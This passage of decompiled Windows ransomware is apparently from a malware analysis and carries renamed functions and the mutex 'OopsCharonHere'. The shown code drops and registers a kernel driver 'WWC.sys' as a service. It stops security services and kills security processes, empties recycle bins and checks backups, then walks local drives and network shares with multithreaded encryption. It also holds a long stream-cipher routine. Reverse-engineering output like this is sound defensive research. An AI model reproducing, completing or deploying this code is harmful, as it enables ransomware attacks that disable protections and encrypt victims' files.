          if ( !WNetGetConnectionW(lpString1 + 4, lpRemoteName, &nLength) )
            fn_walk_directory_recursive(lpRemoteName);
          fn_call_HeapFree(lpRemoteName);
        }
      }
      else
      {
        fn_walk_directory_recursive(lpString1);
      }
    }
    LODWORD(v1) = fn_call_HeapFree(lpString1);
  }
  return (int)v1;
}

//----- (00007FF6E55ABEE0) ----------------------------------------------------
int fn_DropDriverFile()
{
  WCHAR *v0; // rax
  DWORD NumberOfBytesWritten; // [rsp+40h] [rbp-28h] BYREF
  LPWSTR lpString1; // [rsp+48h] [rbp-20h]
  HANDLE hFile; // [rsp+50h] [rbp-18h]

  v0 = (WCHAR *)fn_call_HeapAlloc(0x10000);
  lpString1 = v0;
  if ( v0 )
  {
    lstrcpyW(lpString1, L"\\\\?\\C:\\Windows\\System32\\Drivers\\WWC.sys");
    hFile = CreateFileW(lpString1, 0x40000000u, 0, 0, 2u, 0x8000000u, 0);
    LODWORD(v0) = fn_call_HeapFree(lpString1);
    if ( hFile != (HANDLE)-1LL )
    {
      WriteFile(hFile, &unk_7FF6E55B8260, 0x36E0u, &NumberOfBytesWritten, 0);
      LODWORD(v0) = CloseHandle(hFile);
    }
  }
  return (int)v0;
}

//----- (00007FF6E55ABFA0) ----------------------------------------------------
int fn_CreateService_WWC()
{
  SC_HANDLE v0; // rax
  SC_HANDLE hSCManager; // [rsp+70h] [rbp-18h]
  SC_HANDLE hSCObject; // [rsp+78h] [rbp-10h]

  v0 = OpenSCManagerW(0, 0, 0xF003Fu);
  hSCManager = v0;
  if ( v0 )
  {
    hSCObject = CreateServiceW(
                  v0,
                  L"WWC",
                  L"WWC",
                  0xF01FFu,
                  1u,
                  3u,
                  1u,
                  L"\\??\\C:\\Windows\\System32\\Drivers\\WWC.sys",
                  0,
                  0,
                  0,
                  0,
                  0);
    if ( hSCObject )
    {
      fn_DropDriverFile();
      CloseServiceHandle(hSCObject);
    }
    LODWORD(v0) = CloseServiceHandle(hSCManager);
  }
  return (int)v0;
}
// 7FF6E55ABEE0: using guessed type __int64 sub_14000BEE0(void);

//----- (00007FF6E55AC070) ----------------------------------------------------
int sub_7FF6E55AC070()
{
  SC_HANDLE v0; // rax
  SC_HANDLE hService; // [rsp+20h] [rbp-18h]
  SC_HANDLE hSCManager; // [rsp+28h] [rbp-10h]

  v0 = OpenSCManagerW(0, 0, 0xF003Fu);
  hSCManager = v0;
  if ( v0 )
  {
    hService = OpenServiceW(v0, L"WWC", 0x10u);
    if ( hService )
    {
      StartServiceW(hService, 0, 0);
      CloseServiceHandle(hService);
    }
    LODWORD(v0) = CloseServiceHandle(hSCManager);
  }
  return (int)v0;
}

//----- (00007FF6E55AC0F0) ----------------------------------------------------
void __noreturn start()
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  nullsub_1();
  fn_call_GetProcessHeap();
  hProv = fn_acquire_rsa_aes_provider();
  if ( hProv )
  {
    pNumArgs = 0;
    CommandLineW = GetCommandLineW();
    v25 = CommandLineToArgvW(CommandLineW, &pNumArgs);
    SetProcessShutdownParameters(0, 0);
    argv_debug = (const WCHAR *)fn_get_CommandLine_Argv((unsigned int)pNumArgs, v25, L"debug");
    if ( argv_debug )
    {
      gn_folder[0] = argv_debug;
      fn_Init_LogFile(argv_debug);
      dword_7FF6E55BBB40 = 1;
    }
    fn_StopSecurityServices();
    fn_TerminateSecurityProcesses();
    fn_checkBackup_and_emptyBins();
    SHEmptyRecycleBinA(0, 0, 7u);
    GetSystemInfo(&SystemInfo);
    dwNumberOfProcessors = SystemInfo.dwNumberOfProcessors;
    v24 = 4 * SystemInfo.dwNumberOfProcessors;
    nCount = 4 * SystemInfo.dwNumberOfProcessors / 2;
    fn_work_queue_init((__int64)&unk_7FF6E55BBAA0, 24 * SystemInfo.dwNumberOfProcessors);
    fn_work_queue_init((__int64)&unk_7FF6E55BBAF0, 3 * nCount);
    lpHandles = (HANDLE *)fn_call_HeapAlloc(8LL * nCount);
    v23 = (HANDLE *)fn_call_HeapAlloc(8LL * nCount);
    if ( lpHandles && v23 )
    {
      fn_memset((__int64)lpHandles, 0, 8LL * nCount);
      fn_memset((__int64)v23, 0, 8LL * nCount);
      for ( i = 0; i < nCount; ++i )
      {
        Thread = CreateThread(0, 0, StartAddress_EncryptionThreadProc, (LPVOID)1, 0, 0);
        lpHandles[i] = Thread;
        v2 = CreateThread(0, 0, StartAddress_EncryptionThreadProc, 0, 0, 0);
        v23[i] = v2;
      }
      argv_shares = (LPCWSTR)fn_get_CommandLine_Argv((unsigned int)pNumArgs, v25, L"shares");
      argv_paths = (LPCWSTR)fn_get_CommandLine_Argv((unsigned int)pNumArgs, v25, L"paths");
      if ( argv_shares )
      {
        v12 = 1;
        v27 = lstrlenW(argv_shares);
        for ( j = 0; j < v27; ++j )
        {
          if ( argv_shares[j] == ',' )
          {
            argv_shares[j] = 0;
            ++v12;
          }
        }
        do
        {
          v3 = lstrlenW(argv_shares);
          lpString1 = (LPWSTR)fn_call_HeapAlloc(2LL * (v3 + 1));
          lstrcpyW(lpString1, argv_shares);
          fn_handle_option_shares(lpString1);
          fn_call_HeapFree(lpString1);
          v4 = lstrlenW(argv_shares);
          argv_shares += v4 + 1;
          --v12;
        }
        while ( v12 );
      }
      if ( argv_paths )
      {
        v14 = 1;
        v28 = lstrlenW(argv_paths);
        for ( k = 0; k < v28; ++k )
        {
          if ( argv_paths[k] == ',' )
          {
            argv_paths[k] = 0;
            ++v14;
          }
        }
        do
        {
          v5 = lstrlenW(argv_paths);
          v21 = (LPWSTR)fn_call_HeapAlloc(2LL * (v5 + 1));
          lstrcpyW(v21, argv_paths);
          if ( lstrlenW(v21) == 2 && v21[1] == 58 )
            fn_scan_drive_letter_dispatch(*v21);
          else
            fn_walk_directory_recursive(v21);
          fn_call_HeapFree(v21);
          v6 = lstrlenW(argv_paths);
          argv_paths += v6 + 1;
          --v14;
        }
        while ( v14 );
      }
      if ( !argv_paths && !argv_shares && !OpenMutexA(0x1F0001u, 0, "OopsCharonHere") )
      {
        CreateMutexA(0, 0, "OopsCharonHere");
        v31 = 0;
        if ( fn_check_commandLine_Flag(pNumArgs, (__int64)v25, L"sf") == 1 )
          fn_Enumerate_Network_Resoures(v31);
        fn_MountAllVolumes();
        LogicalDrives = GetLogicalDrives();
        if ( LogicalDrives )
        {
          for ( m = 65; m <= 0x5Au; ++m )
          {
            if ( (LogicalDrives & 1) != 0 )
              fn_scan_drive_letter_dispatch(m);
            LogicalDrives >>= 1;
          }
        }
        if ( !fn_check_commandLine_Flag(pNumArgs, (__int64)v25, L"sf") )
          fn_Enumerate_Network_Resoures(v31);
      }
      for ( n = 0; n < nCount; ++n )
        fn_ring_queue_enqueue_wstr((__int64)&unk_7FF6E55BBAF0, 0, 1);
      WaitForMultipleObjects(nCount, lpHandles, 1, 0xFFFFFFFF);
      for ( ii = 0; ii < nCount; ++ii )
        fn_ring_queue_enqueue_wstr((__int64)&unk_7FF6E55BBAA0, 0, 1);
      WaitForMultipleObjects(nCount, v23, 1, 0xFFFFFFFF);
      fn_checkBackup_and_emptyBins();
      for ( jj = 0; jj < nCount; ++jj )
      {
        CloseHandle(lpHandles[jj]);
        CloseHandle(v23[jj]);
      }
      fn_call_HeapFree(lpHandles);
      fn_call_HeapFree(v23);
    }
    if ( dword_7FF6E55BBB40 )
      fn_cleanup_lock_and_handle();
    CryptReleaseContext(hProv, 0);
  }
  ExitProcess(0);
}
// 7FF6E55A3FC8: using guessed type wchar_t aDebug[6];
// 7FF6E55A3FD8: using guessed type wchar_t aShares[7];
// 7FF6E55A3FE8: using guessed type wchar_t aPaths[6];
// 7FF6E55A4018: using guessed type wchar_t aSf[3];
// 7FF6E55A4020: using guessed type wchar_t aSf_0[3];
// 7FF6E55A5650: using guessed type __int64 __fastcall fn_get_CommandLine_Argv(_QWORD, _QWORD, _QWORD);
// 7FF6E55A5940: using guessed type __int64 fn_cleanup_lock_and_handle(void);
// 7FF6E55BB940: using guessed type LPCWSTR qword_7FF6E55BB940[1];
// 7FF6E55BBB40: using guessed type int dword_7FF6E55BBB40;

//----- (00007FF6E55AC800) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55AC800(__int64 a1)
{
  *(_DWORD *)(a1 + 56) = 0;
  *(_QWORD *)(a1 + 64) = 0;
  *(_DWORD *)(a1 + 72) = 0;
  *(_DWORD *)(a1 + 76) = 0;
  return a1;
}

//----- (00007FF6E55AC840) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55AC840(_DWORD *a1, int *a2)
{
  __int64 result; // rax
  int v3; // [rsp+0h] [rbp-258h]
  int v4; // [rsp+54h] [rbp-204h]
  int v5; // [rsp+64h] [rbp-1F4h]
  int v6; // [rsp+74h] [rbp-1E4h]
  int v7; // [rsp+84h] [rbp-1D4h]
  int v8; // [rsp+94h] [rbp-1C4h]
  int v9; // [rsp+A4h] [rbp-1B4h]
  int v10; // [rsp+B4h] [rbp-1A4h]
  int v11; // [rsp+C4h] [rbp-194h]
  int v12; // [rsp+D4h] [rbp-184h]
  int v13; // [rsp+E4h] [rbp-174h]
  int v14; // [rsp+F4h] [rbp-164h]
  int v15; // [rsp+104h] [rbp-154h]
  int v16; // [rsp+114h] [rbp-144h]
  int v17; // [rsp+124h] [rbp-134h]
  int v18; // [rsp+134h] [rbp-124h]
  int v19; // [rsp+144h] [rbp-114h]
  int v20; // [rsp+154h] [rbp-104h]
  int v21; // [rsp+164h] [rbp-F4h]
  int v22; // [rsp+174h] [rbp-E4h]
  int v23; // [rsp+184h] [rbp-D4h]
  int v24; // [rsp+194h] [rbp-C4h]
  int v25; // [rsp+1A4h] [rbp-B4h]
  int v26; // [rsp+1B4h] [rbp-A4h]
  int v27; // [rsp+1C4h] [rbp-94h]
  int v28; // [rsp+1D4h] [rbp-84h]
  int v29; // [rsp+1E4h] [rbp-74h]
  int v30; // [rsp+1F4h] [rbp-64h]
  int v31; // [rsp+204h] [rbp-54h]
  int v32; // [rsp+214h] [rbp-44h]
  int v33; // [rsp+224h] [rbp-34h]
  int v34; // [rsp+234h] [rbp-24h]
  int v35; // [rsp+244h] [rbp-14h]

  v3 = a1[1056] & 0x1FF;
  if ( a1[1056] >= 0x200u )
  {
    a1[1056] = ((unsigned __int16)a1[1056] + 16) & 0x3FF;
    v20 = a1[(unsigned __int8)BYTE2(a1[1044]) + 256] + a1[*((unsigned __int8 *)a1 + 4176)];
    a1[v3 + 512] += (((a1[1053] >> 22) | (a1[1053] << 10)) ^ ((a1[v3 + 513] >> 9) | (a1[v3 + 513] << 23)))
                  + (HIBYTE(a1[1046]) | (a1[1046] << 8));
    a1[1040] = a1[v3 + 512];
    *a2 = a1[v3 + 512] ^ v20;
    v21 = a1[(unsigned __int8)BYTE2(a1[1045]) + 256] + a1[*((unsigned __int8 *)a1 + 4180)];
    a1[v3 + 513] += (((a1[1054] >> 22) | (a1[1054] << 10)) ^ ((a1[v3 + 514] >> 9) | (a1[v3 + 514] << 23)))
                  + (HIBYTE(a1[1047]) | (a1[1047] << 8));
    a1[1041] = a1[v3 + 513];
    a2[1] = a1[v3 + 513] ^ v21;
    v22 = a1[(unsigned __int8)BYTE2(a1[1046]) + 256] + a1[*((unsigned __int8 *)a1 + 4184)];
    a1[v3 + 514] += (((a1[1055] >> 22) | (a1[1055] << 10)) ^ ((a1[v3 + 515] >> 9) | (a1[v3 + 515] << 23)))
                  + (HIBYTE(a1[1048]) | (a1[1048] << 8));
    a1[1042] = a1[v3 + 514];
    a2[2] = a1[v3 + 514] ^ v22;
    v23 = a1[(unsigned __int8)BYTE2(a1[1047]) + 256] + a1[*((unsigned __int8 *)a1 + 4188)];
    a1[v3 + 515] += (((a1[1040] >> 22) | (a1[1040] << 10)) ^ ((a1[v3 + 516] >> 9) | (a1[v3 + 516] << 23)))
                  + (HIBYTE(a1[1049]) | (a1[1049] << 8));
    a1[1043] = a1[v3 + 515];
    a2[3] = a1[v3 + 515] ^ v23;
    v24 = a1[(unsigned __int8)BYTE2(a1[1048]) + 256] + a1[*((unsigned __int8 *)a1 + 4192)];
    a1[v3 + 516] += (((a1[1041] >> 22) | (a1[1041] << 10)) ^ ((a1[v3 + 517] >> 9) | (a1[v3 + 517] << 23)))
                  + (HIBYTE(a1[1050]) | (a1[1050] << 8));
    a1[1044] = a1[v3 + 516];
    a2[4] = a1[v3 + 516] ^ v24;
    v25 = a1[(unsigned __int8)BYTE2(a1[1049]) + 256] + a1[*((unsigned __int8 *)a1 + 4196)];
    a1[v3 + 517] += (((a1[1042] >> 22) | (a1[1042] << 10)) ^ ((a1[v3 + 518] >> 9) | (a1[v3 + 518] << 23)))
                  + (HIBYTE(a1[1051]) | (a1[1051] << 8));
    a1[1045] = a1[v3 + 517];
    a2[5] = a1[v3 + 517] ^ v25;
    v26 = a1[(unsigned __int8)BYTE2(a1[1050]) + 256] + a1[*((unsigned __int8 *)a1 + 4200)];
    a1[v3 + 518] += (((a1[1043] >> 22) | (a1[1043] << 10)) ^ ((a1[v3 + 519] >> 9) | (a1[v3 + 519] << 23)))
                  + (HIBYTE(a1[1052]) | (a1[1052] << 8));
    a1[1046] = a1[v3 + 518];
    a2[6] = a1[v3 + 518] ^ v26;
    v27 = a1[(unsigned __int8)BYTE2(a1[1051]) + 256] + a1[*((unsigned __int8 *)a1 + 4204)];
    a1[v3 + 519] += (((a1[1044] >> 22) | (a1[1044] << 10)) ^ ((a1[v3 + 520] >> 9) | (a1[v3 + 520] << 23)))
                  + (HIBYTE(a1[1053]) | (a1[1053] << 8));
    a1[1047] = a1[v3 + 519];
    a2[7] = a1[v3 + 519] ^ v27;
    v28 = a1[(unsigned __int8)BYTE2(a1[1052]) + 256] + a1[*((unsigned __int8 *)a1 + 4208)];
    a1[v3 + 520] += (((a1[1045] >> 22) | (a1[1045] << 10)) ^ ((a1[v3 + 521] >> 9) | (a1[v3 + 521] << 23)))
                  + (HIBYTE(a1[1054]) | (a1[1054] << 8));
    a1[1048] = a1[v3 + 520];
    a2[8] = a1[v3 + 520] ^ v28;
    v29 = a1[(unsigned __int8)BYTE2(a1[1053]) + 256] + a1[*((unsigned __int8 *)a1 + 4212)];
    a1[v3 + 521] += (((a1[1046] >> 22) | (a1[1046] << 10)) ^ ((a1[v3 + 522] >> 9) | (a1[v3 + 522] << 23)))
                  + (HIBYTE(a1[1055]) | (a1[1055] << 8));
    a1[1049] = a1[v3 + 521];
    a2[9] = a1[v3 + 521] ^ v29;
    v30 = a1[(unsigned __int8)BYTE2(a1[1054]) + 256] + a1[*((unsigned __int8 *)a1 + 4216)];
    a1[v3 + 522] += (((a1[1047] >> 22) | (a1[1047] << 10)) ^ ((a1[v3 + 523] >> 9) | (a1[v3 + 523] << 23)))
                  + (HIBYTE(a1[1040]) | (a1[1040] << 8));
    a1[1050] = a1[v3 + 522];
    a2[10] = a1[v3 + 522] ^ v30;
    v31 = a1[(unsigned __int8)BYTE2(a1[1055]) + 256] + a1[*((unsigned __int8 *)a1 + 4220)];
    a1[v3 + 523] += (((a1[1048] >> 22) | (a1[1048] << 10)) ^ ((a1[v3 + 524] >> 9) | (a1[v3 + 524] << 23)))
                  + (HIBYTE(a1[1041]) | (a1[1041] << 8));
    a1[1051] = a1[v3 + 523];
    a2[11] = a1[v3 + 523] ^ v31;
    v32 = a1[(unsigned __int8)BYTE2(a1[1040]) + 256] + a1[*((unsigned __int8 *)a1 + 4160)];
    a1[v3 + 524] += (((a1[1049] >> 22) | (a1[1049] << 10)) ^ ((a1[v3 + 525] >> 9) | (a1[v3 + 525] << 23)))
                  + (HIBYTE(a1[1042]) | (a1[1042] << 8));
    a1[1052] = a1[v3 + 524];
    a2[12] = a1[v3 + 524] ^ v32;
    v33 = a1[(unsigned __int8)BYTE2(a1[1041]) + 256] + a1[*((unsigned __int8 *)a1 + 4164)];
    a1[v3 + 525] += (((a1[1050] >> 22) | (a1[1050] << 10)) ^ ((a1[v3 + 526] >> 9) | (a1[v3 + 526] << 23)))
                  + (HIBYTE(a1[1043]) | (a1[1043] << 8));
    a1[1053] = a1[v3 + 525];
    a2[13] = a1[v3 + 525] ^ v33;
    v34 = a1[(unsigned __int8)BYTE2(a1[1042]) + 256] + a1[*((unsigned __int8 *)a1 + 4168)];
    a1[v3 + 526] += (((a1[1051] >> 22) | (a1[1051] << 10)) ^ ((a1[v3 + 527] >> 9) | (a1[v3 + 527] << 23)))
                  + (HIBYTE(a1[1044]) | (a1[1044] << 8));
    a1[1054] = a1[v3 + 526];
    a2[14] = a1[v3 + 526] ^ v34;
    v35 = a1[(unsigned __int8)BYTE2(a1[1043]) + 256] + a1[*((unsigned __int8 *)a1 + 4172)];
    a1[v3 + 527] += (((a1[1052] >> 22) | (a1[1052] << 10))
                   ^ ((a1[(((_WORD)v3 + 16) & 0x1FF) + 512] >> 9) | (a1[(((_WORD)v3 + 16) & 0x1FF) + 512] << 23)))
                  + (HIBYTE(a1[1045]) | (a1[1045] << 8));
    a1[1055] = a1[v3 + 527];
    result = a1[v3 + 527] ^ (unsigned int)v35;
  }
  else
  {
    a1[1056] = ((unsigned __int16)a1[1056] + 16) & 0x3FF;
    v4 = a1[(unsigned __int8)BYTE2(a1[1028]) + 768] + a1[*((unsigned __int8 *)a1 + 4112) + 512];
    a1[v3] += (((a1[1037] >> 10) | (a1[1037] << 22)) ^ ((a1[v3 + 1] >> 23) | (a1[v3 + 1] << 9)))
            + ((a1[1030] >> 8) | (a1[1030] << 24));
    a1[1024] = a1[v3];
    *a2 = a1[v3] ^ v4;
    v5 = a1[(unsigned __int8)BYTE2(a1[1029]) + 768] + a1[*((unsigned __int8 *)a1 + 4116) + 512];
    a1[v3 + 1] += (((a1[1038] >> 10) | (a1[1038] << 22)) ^ ((a1[v3 + 2] >> 23) | (a1[v3 + 2] << 9)))
                + ((a1[1031] >> 8) | (a1[1031] << 24));
    a1[1025] = a1[v3 + 1];
    a2[1] = a1[v3 + 1] ^ v5;
    v6 = a1[(unsigned __int8)BYTE2(a1[1030]) + 768] + a1[*((unsigned __int8 *)a1 + 4120) + 512];
    a1[v3 + 2] += (((a1[1039] >> 10) | (a1[1039] << 22)) ^ ((a1[v3 + 3] >> 23) | (a1[v3 + 3] << 9)))
                + ((a1[1032] >> 8) | (a1[1032] << 24));
    a1[1026] = a1[v3 + 2];
    a2[2] = a1[v3 + 2] ^ v6;
    v7 = a1[(unsigned __int8)BYTE2(a1[1031]) + 768] + a1[*((unsigned __int8 *)a1 + 4124) + 512];
    a1[v3 + 3] += (((a1[1024] >> 10) | (a1[1024] << 22)) ^ ((a1[v3 + 4] >> 23) | (a1[v3 + 4] << 9)))
                + ((a1[1033] >> 8) | (a1[1033] << 24));
    a1[1027] = a1[v3 + 3];
    a2[3] = a1[v3 + 3] ^ v7;
    v8 = a1[(unsigned __int8)BYTE2(a1[1032]) + 768] + a1[*((unsigned __int8 *)a1 + 4128) + 512];
    a1[v3 + 4] += (((a1[1025] >> 10) | (a1[1025] << 22)) ^ ((a1[v3 + 5] >> 23) | (a1[v3 + 5] << 9)))
                + ((a1[1034] >> 8) | (a1[1034] << 24));
    a1[1028] = a1[v3 + 4];
    a2[4] = a1[v3 + 4] ^ v8;
    v9 = a1[(unsigned __int8)BYTE2(a1[1033]) + 768] + a1[*((unsigned __int8 *)a1 + 4132) + 512];
    a1[v3 + 5] += (((a1[1026] >> 10) | (a1[1026] << 22)) ^ ((a1[v3 + 6] >> 23) | (a1[v3 + 6] << 9)))
                + ((a1[1035] >> 8) | (a1[1035] << 24));
    a1[1029] = a1[v3 + 5];
    a2[5] = a1[v3 + 5] ^ v9;
    v10 = a1[(unsigned __int8)BYTE2(a1[1034]) + 768] + a1[*((unsigned __int8 *)a1 + 4136) + 512];
    a1[v3 + 6] += (((a1[1027] >> 10) | (a1[1027] << 22)) ^ ((a1[v3 + 7] >> 23) | (a1[v3 + 7] << 9)))
                + ((a1[1036] >> 8) | (a1[1036] << 24));
    a1[1030] = a1[v3 + 6];
    a2[6] = a1[v3 + 6] ^ v10;
    v11 = a1[(unsigned __int8)BYTE2(a1[1035]) + 768] + a1[*((unsigned __int8 *)a1 + 4140) + 512];
    a1[v3 + 7] += (((a1[1028] >> 10) | (a1[1028] << 22)) ^ ((a1[v3 + 8] >> 23) | (a1[v3 + 8] << 9)))
                + ((a1[1037] >> 8) | (a1[1037] << 24));
    a1[1031] = a1[v3 + 7];
    a2[7] = a1[v3 + 7] ^ v11;
    v12 = a1[(unsigned __int8)BYTE2(a1[1036]) + 768] + a1[*((unsigned __int8 *)a1 + 4144) + 512];
    a1[v3 + 8] += (((a1[1029] >> 10) | (a1[1029] << 22)) ^ ((a1[v3 + 9] >> 23) | (a1[v3 + 9] << 9)))
                + ((a1[1038] >> 8) | (a1[1038] << 24));
    a1[1032] = a1[v3 + 8];
    a2[8] = a1[v3 + 8] ^ v12;
    v13 = a1[(unsigned __int8)BYTE2(a1[1037]) + 768] + a1[*((unsigned __int8 *)a1 + 4148) + 512];
    a1[v3 + 9] += (((a1[1030] >> 10) | (a1[1030] << 22)) ^ ((a1[v3 + 10] >> 23) | (a1[v3 + 10] << 9)))
                + ((a1[1039] >> 8) | (a1[1039] << 24));
    a1[1033] = a1[v3 + 9];
    a2[9] = a1[v3 + 9] ^ v13;
    v14 = a1[(unsigned __int8)BYTE2(a1[1038]) + 768] + a1[*((unsigned __int8 *)a1 + 4152) + 512];
    a1[v3 + 10] += (((a1[1031] >> 10) | (a1[1031] << 22)) ^ ((a1[v3 + 11] >> 23) | (a1[v3 + 11] << 9)))
                 + ((a1[1024] >> 8) | (a1[1024] << 24));
    a1[1034] = a1[v3 + 10];
    a2[10] = a1[v3 + 10] ^ v14;
    v15 = a1[(unsigned __int8)BYTE2(a1[1039]) + 768] + a1[*((unsigned __int8 *)a1 + 4156) + 512];
    a1[v3 + 11] += (((a1[1032] >> 10) | (a1[1032] << 22)) ^ ((a1[v3 + 12] >> 23) | (a1[v3 + 12] << 9)))
                 + ((a1[1025] >> 8) | (a1[1025] << 24));
    a1[1035] = a1[v3 + 11];
    a2[11] = a1[v3 + 11] ^ v15;
    v16 = a1[(unsigned __int8)BYTE2(a1[1024]) + 768] + a1[*((unsigned __int8 *)a1 + 4096) + 512];
    a1[v3 + 12] += (((a1[1033] >> 10) | (a1[1033] << 22)) ^ ((a1[v3 + 13] >> 23) | (a1[v3 + 13] << 9)))
                 + ((a1[1026] >> 8) | (a1[1026] << 24));
    a1[1036] = a1[v3 + 12];
    a2[12] = a1[v3 + 12] ^ v16;
    v17 = a1[(unsigned __int8)BYTE2(a1[1025]) + 768] + a1[*((unsigned __int8 *)a1 + 4100) + 512];
    a1[v3 + 13] += (((a1[1034] >> 10) | (a1[1034] << 22)) ^ ((a1[v3 + 14] >> 23) | (a1[v3 + 14] << 9)))
                 + ((a1[1027] >> 8) | (a1[1027] << 24));
    a1[1037] = a1[v3 + 13];
    a2[13] = a1[v3 + 13] ^ v17;
    v18 = a1[(unsigned __int8)BYTE2(a1[1026]) + 768] + a1[*((unsigned __int8 *)a1 + 4104) + 512];
    a1[v3 + 14] += (((a1[1035] >> 10) | (a1[1035] << 22)) ^ ((a1[v3 + 15] >> 23) | (a1[v3 + 15] << 9)))
                 + ((a1[1028] >> 8) | (a1[1028] << 24));
    a1[1038] = a1[v3 + 14];
    a2[14] = a1[v3 + 14] ^ v18;
    v19 = a1[(unsigned __int8)BYTE2(a1[1027]) + 768] + a1[*((unsigned __int8 *)a1 + 4108) + 512];
    a1[v3 + 15] += (((a1[1036] >> 10) | (a1[1036] << 22))
                  ^ ((a1[((_WORD)v3 + 16) & 0x1FF] >> 23) | (a1[((_WORD)v3 + 16) & 0x1FF] << 9)))
                 + ((a1[1029] >> 8) | (a1[1029] << 24));
    a1[1039] = a1[v3 + 15];
    result = a1[v3 + 15] ^ (unsigned int)v19;
  }
  a2[15] = result;
  return result;
}

//----- (00007FF6E55B01F0) ----------------------------------------------------
__int64 __fastcall sub_7FF6E55B01F0(_DWORD *a1)
{
  __int64 result; // rax
  int v2; // [rsp+0h] [rbp-258h]

  v2 = a1[1056] & 0x1FF;
  if ( a1[1056] >= 0x200u )
  {
    a1[1056] = ((unsigned __int16)a1[1056] + 16) & 0x3FF;
    a1[v2 + 512] = (a1[(unsigned __int8)BYTE2(a1[1044]) + 256] + a1[*((unsigned __int8 *)a1 + 4176)])
                 ^ ((((a1[1053] >> 22) | (a1[1053] << 10)) ^ ((a1[v2 + 513] >> 9) | (a1[v2 + 513] << 23)))
                  + (HIBYTE(a1[1046]) | (a1[1046] << 8))
                  + a1[v2 + 512]);
    a1[1040] = a1[v2 + 512];
    a1[v2 + 513] = (a1[(unsigned __int8)BYTE2(a1[1045]) + 256] + a1[*((unsigned __int8 *)a1 + 4180)])
                 ^ ((((a1[1054] >> 22) | (a1[1054] << 10)) ^ ((a1[v2 + 514] >> 9) | (a1[v2 + 514] << 23)))
                  + (HIBYTE(a1[1047]) | (a1[1047] << 8))
                  + a1[v2 + 513]);
    a1[1041] = a1[v2 + 513];
    a1[v2 + 514] = (a1[(unsigned __int8)BYTE2(a1[1046]) + 256] + a1[*((unsigned __int8 *)a1 + 4184)])
                 ^ ((((a1[1055] >> 22) | (a1[1055] << 10)) ^ ((a1[v2 + 515] >> 9) | (a1[v2 + 515] << 23)))
                  + (HIBYTE(a1[1048]) | (a1[1048] << 8))
                  + a1[v2 + 514]);
    a1[1042] = a1[v2 + 514];
    a1[v2 + 515] = (a1[(unsigned __int8)BYTE2(a1[1047]) + 256] + a1[*((unsigned __int8 *)a1 + 4188)])
                 ^ ((((a1[1040] >> 22) | (a1[1040] << 10)) ^ ((a1[v2 + 516] >> 9) | (a1[v2 + 516] << 23)))
                  + (HIBYTE(a1[1049]) | (a1[1049] << 8))
                  + a1[v2 + 515]);
    a1[1043] = a1[v2 + 515];
    a1[v2 + 516] = (a1[(unsigned __int8)BYTE2(a1[1048]) + 256] + a1[*((unsigned __int8 *)a1 + 4192)])
                 ^ ((((a1[1041] >> 22) | (a1[1041] << 10)) ^ ((a1[v2 + 517] >> 9) | (a1[v2 + 517] << 23)))
                  + (HIBYTE(a1[1050]) | (a1[1050] << 8))
                  + a1[v2 + 516]);
    a1[1044] = a1[v2 + 516];
    a1[v2 + 517] = (a1[(unsigned __int8)BYTE2(a1[1049]) + 256] + a1[*((unsigned __int8 *)a1 + 4196)])
                 ^ ((((a1[1042] >> 22) | (a1[1042] << 10)) ^ ((a1[v2 + 518] >> 9) | (a1[v2 + 518] << 23)))
                  + (HIBYTE(a1[1051]) | (a1[1051] << 8))
                  + a1[v2 + 517]);
    a1[1045] = a1[v2 + 517];
    a1[v2 + 518] = (a1[(unsigned __int8)BYTE2(a1[1050]) + 256] + a1[*((unsigned __int8 *)a1 + 4200)])
                 ^ ((((a1[1043] >> 22) | (a1[1043] << 10)) ^ ((a1[v2 + 519] >> 9) | (a1[v2 + 519] << 23)))
                  + (HIBYTE(a1[1052]) | (a1[1052] << 8))
                  + a1[v2 + 518]);
    a1[1046] = a1[v2 + 518];
    a1[v2 + 519] = (a1[(unsigned __int8)BYTE2(a1[1051]) + 256] + a1[*((unsigned __int8 *)a1 + 4204)])
                 ^ ((((a1[1044] >> 22) | (a1[1044] << 10)) ^ ((a1[v2 + 520] >> 9) | (a1[v2 + 520] << 23)))
                  + (HIBYTE(a1[1053]) | (a1[1053] << 8))
                  + a1[v2 + 519]);
    a1[1047] = a1[v2 + 519];
    a1[v2 + 520] = (a1[(unsigned __int8)BYTE2(a1[1052]) + 256] + a1[*((unsigned __int8 *)a1 + 4208)])
                 ^ ((((a1[1045] >> 22) | (a1[1045] << 10)) ^ ((a1[v2 + 521] >> 9) | (a1[v2 + 521] << 23)))
                  + (HIBYTE(a1[1054]) | (a1[1054] << 8))
                  + a1[v2 + 520]);
    a1[1048] = a1[v2 + 520];
    a1[v2 + 521] = (a1[(unsigned __int8)BYTE2(a1[1053]) + 256] + a1[*((unsigned __int8 *)a1 + 4212)])
                 ^ ((((a1[1046] >> 22) | (a1[1046] << 10)) ^ ((a1[v2 + 522] >> 9) | (a1[v2 + 522] << 23)))
                  + (HIBYTE(a1[1055]) | (a1[1055] << 8))
                  + a1[v2 + 521]);
    a1[1049] = a1[v2 + 521];
    a1[v2 + 522] = (a1[(unsigned __int8)BYTE2(a1[1054]) + 256] + a1[*((unsigned __int8 *)a1 + 4216)])
                 ^ ((((a1[1047] >> 22) | (a1[1047] << 10)) ^ ((a1[v2 + 523] >> 9) | (a1[v2 + 523] << 23)))
                  + (HIBYTE(a1[1040]) | (a1[1040] << 8))
                  + a1[v2 + 522]);
    a1[1050] = a1[v2 + 522];
    a1[v2 + 523] = (a1[(unsigned __int8)BYTE2(a1[1055]) + 256] + a1[*((unsigned __int8 *)a1 + 4220)])
                 ^ ((((a1[1048] >> 22) | (a1[1048] << 10)) ^ ((a1[v2 + 524] >> 9) | (a1[v2 + 524] << 23)))
                  + (HIBYTE(a1[1041]) | (a1[1041] << 8))
                  + a1[v2 + 523]);
    a1[1051] = a1[v2 + 523];
    a1[v2 + 524] = (a1[(unsigned __int8)BYTE2(a1[1040]) + 256] + a1[*((unsigned __int8 *)a1 + 4160)])
                 ^ ((((a1[1049] >> 22) | (a1[1049] << 10)) ^ ((a1[v2 + 525] >> 9) | (a1[v2 + 525] << 23)))
                  + (HIBYTE(a1[1042]) | (a1[1042] << 8))
                  + a1[v2 + 524]);
    a1[1052] = a1[v2 + 524];
    a1[v2 + 525] = (a1[(unsigned __int8)BYTE2(a1[1041]) + 256] + a1[*((unsigned __int8 *)a1 + 4164)])
